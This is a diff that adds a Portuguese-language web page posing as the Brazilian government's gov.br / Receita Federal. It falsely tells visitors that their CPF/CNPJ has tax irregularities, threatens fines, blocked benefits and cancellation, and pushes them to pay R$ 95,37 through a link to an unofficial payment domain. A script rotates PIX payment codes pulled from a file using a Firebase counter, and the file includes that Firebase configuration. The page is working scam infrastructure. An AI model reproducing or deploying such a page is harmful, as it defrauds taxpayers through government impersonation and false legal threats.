@@ -1,0 +1,275 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Regularização Financeira</title>
+    <style>
+    :root{
+      --bg:#ffffff;
+      --fg:#111827;
+      --muted:#6b7280;
+      --primary:#0ea5e9;
+      --primary-hover:#0284c7;
+      --border:#e5e7eb;
+      --accent:#f3f4f6;
+    }
+    *{box-sizing:border-box}
+    html,body{height:100%}
+    body{
+      margin:0;
+      font-family:system-ui,-apple-system,Segoe UI,Roboto,Ubuntu,"Helvetica Neue",Arial,"Noto Sans",sans-serif;
+      line-height:1.6;
+      color:var(--fg);
+      background:var(--bg);
+    }
+    .wrap{
+      max-width:900px;
+      margin:0 auto;
+      padding:32px 24px 56px;
+    }
+    header{
+      display:flex;
+      align-items:center;
+      justify-content:center;
+      margin-bottom:16px;
+    }
+    .logo{
+      font-weight:800;
+      font-size:48px;
+      letter-spacing:-1px;
+      line-height:1;
+      display:inline-flex;
+      gap:6px;
+      user-select:none;
+      width: 200px; 
+    }
+    .logo .g{color:#2563eb}
+    .logo .o{color:#f59e0b}
+    .logo .v{color:#22c55e}
+    .logo .br{color:#111827}
+
+    h1,h2,h3{line-height:1.3;margin:1.25em 0 .5em}
+    h1{font-size:clamp(20px,2.4vw,26px)}
+    h2{font-size:clamp(18px,2.2vw,22px)}
+    h3{font-size:clamp(16px,2vw,20px)}
+    p{margin:.6em 0}
+
+    .card{
+      background:#fff;
+      border:1px solid var(--border);
+      border-radius:14px;
+      padding:18px 18px;
+      box-shadow:0 2px 6px rgba(0,0,0,.04);
+    }
+
+    .muted{color:var(--muted)}
+    .money{font-weight:700}
+
+    .btn{
+      display:inline-block;
+      width:100%;
+      text-align:center;
+      padding:14px 18px;
+      border-radius:12px;
+      border:1px solid transparent;
+      background:var(--primary);
+      color:#fff;
+      font-weight:700;
+      text-decoration:none;
+      transition:background-color .15s ease, transform .02s ease;
+      margin-top:14px;
+    }
+    .btn:hover{background:var(--primary-hover)}
+    .btn:active{transform:translateY(1px)}
+
+    .kicker{font-size:14px;color:var(--muted)}
+    .hr{height:1px;background:var(--border);margin:20px 0}
+
+    ul{padding-left:18px}
+    li{margin:.4em 0}
+
+    footer{margin-top:28px;color:var(--muted);font-size:14px}
+
+    @media (max-width:640px){
+      .wrap{padding:20px 16px 40px}
+      .logo{font-size:40px}
+    }
+    @media print{
+      .btn{display:none}
+      .card{box-shadow:none}
+    }
+  </style>
+    <!-- SweetAlert2 -->
+    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
+</head>
+<body>
+    <main class="wrap">
+    <header aria-label="Identidade gov.br">
+      <div class="logo" aria-hidden="true">
+        <img class="logo" src="logo.png" alt="gov.br">
+      </div>
+    </header> <br><br>
+          <section class="card" aria-labelledby="intro">
+            <h1>Regularização CPF / CNPJ </h1>
+            <p>Prezado(a) Contribuinte, após a abertura do seu CNPJ constatamos irregularidades no seu CPF.</p>
+            <p>Verificamos em nossos registros que existe pendências relacionadas na entrega do seu Imposto de Renda.</p>
+            <p>A inadimplência do pagamento resultará na inclusão do débito na dívida ativa da União, gerando protestos e a negativação do CNPJ/CPF em órgãos de proteção ao crédito.</p>
+<p> Este e-mail é monitorado automaticamente, considerando a data atual como vencimento. Caso ultrapasse o prazo, haverá cobrança de juros e multa diária no valor de R$ 15,32. previstos no Art da Lei 10.522 de 19 de Julho de 2002  </p>            
+<p>Para evitar maiores transtornos, pedimos que regularize o valor devido através do código PIX copia e cola o quanto antes.</p>
+
+            <p><strong>Valor Pendente:</strong> R$ 95,37</p>
+          
+        
+            <a class="btn" href="https://pagamento.pagamentoseguroregularizacao.online/checkout?product=5449a9d7-665e-11f1-a1eb-46da4690ad53" target="_blank" rel="noopener" aria-label="Clique aqui para regularizar seu CNPJ">CLIQUE AQUI PARA REGULARIZAR</a>
+
+
+            <p>Consequências do Não Pagamento:</p>
+            <ul>
+                <li>Juros e Penalidades Adicionais: O débito poderá ser acrescido de encargos e multas.</li>
+                <li>Suspensão de Benefícios Previdenciários: O atraso pode bloquear o acesso a benefícios, como aposentadoria e auxílio-doença.</li>
+                <li>Cancelamento do CNPJ/CPF: O registro da empresa poderá ser revogado se a pendência não for quitada.</li>
+                <li>Impedimentos em Certidões Fiscais: O não pagamento dificultará a emissão de certidões negativas, comprometendo transações financeiras.</li>
+                <li>Barreiras em Novos Negócios: Sua empresa poderá encontrar dificuldades em estabelecer contratos e parcerias comerciais.</li>
+
+		<br>
+		<li> Receita Federal - GOV.BR </li>
+            </ul>
+        </div>
+    </div>
+    <br><br><br>
+    <footer>
+        Gov.BR
+    </footer>
+    <script>
+        function copyPixKey() {
+            const pixKey = document.getElementById('pix-key').textContent;
+            navigator.clipboard.writeText(pixKey).then(() => {
+                Swal.fire({
+                    title: 'Sucesso!',
+                    text: 'Código Pix copiado com sucesso.',
+                    icon: 'success',
+                    confirmButtonText: 'OK'
+                });
+            }).catch(err => {
+                console.error('Erro ao copiar a chave PIX: ', err);
+            });
+        }
+    </script>
+
+
+
+
+
+
+
+
+
+
+<script type="module">
+import { initializeApp } from "https://www.gstatic.com/firebasejs/12.0.0/firebase-app.js";
+import { getDatabase, ref, runTransaction } from "https://www.gstatic.com/firebasejs/12.0.0/firebase-database.js";
+
+// 🔧 Firebase config
+const firebaseConfig = {
+   apiKey: "AIzaSyBAdj2iWBXXR-zl3WjVQvzfbQYgzlf0URs",
+   authDomain: "contador-17913.firebaseapp.com",
+   databaseURL: "https://contador-17913-default-rtdb.firebaseio.com",
+   projectId: "contador-17913",
+   storageBucket: "contador-17913.firebasestorage.app",
+   messagingSenderId: "596745198399",
+   appId: "1:596745198399:web:e14ad9228749ca02c3518a"
+};
+
+const app = initializeApp(firebaseConfig);
+const db = getDatabase(app);
+
+let linhaAtual = "";
+
+/* =========================
+   📄 Carregar linhas
+========================= */
+async function carregarLinhas() {
+    try {
+        const res = await fetch("linhas.txt", { cache: "no-store" });
+
+        if (!res.ok) throw new Error("Erro ao carregar linhas.txt");
+
+        const texto = await res.text();
+
+        return texto
+            .split("\n")
+            .map(l => l.trim())
+            .filter(Boolean);
+
+    } catch (err) {
+        console.error(err);
+        return [];
+    }
+}
+
+/* =========================
+   🔢 Incrementar contador (Firebase)
+========================= */
+async function proximoIndice() {
+    const contadorRef = ref(db, "contador");
+
+    const result = await runTransaction(contadorRef, (valor) => {
+        if (valor === null) return 1;
+        return valor + 1;
+    });
+
+    return result.snapshot.val() - 1;
+}
+
+/* =========================
+   🚀 Inicialização
+========================= */
+async function iniciar() {
+    const el = document.getElementById("linha-atual");
+
+    el.textContent = "Carregando...";
+
+    const linhas = await carregarLinhas();
+
+    if (!linhas.length) {
+        el.textContent = "Nenhum item encontrado.";
+        return;
+    }
+
+    const contador = await proximoIndice();
+
+    const indice = contador % linhas.length;
+
+    linhaAtual = linhas[indice];
+
+    el.textContent = linhaAtual;
+}
+
+/* =========================
+   📋 Copiar
+========================= */
+window.copiarLinha = async function () {
+    try {
+        await navigator.clipboard.writeText(linhaAtual);
+
+        if (typeof Swal !== "undefined") {
+            Swal.fire({
+                title: "Copiado!",
+                text: "Código Pix copiado com sucesso.",
+                icon: "success"
+            });
+        } else {
+            alert("Copiado!");
+        }
+
+    } catch (err) {
+        console.error(err);
+        alert("Erro ao copiar.");
+    }
+};
+
+iniciar();
+</script>
+</body>
+</html>
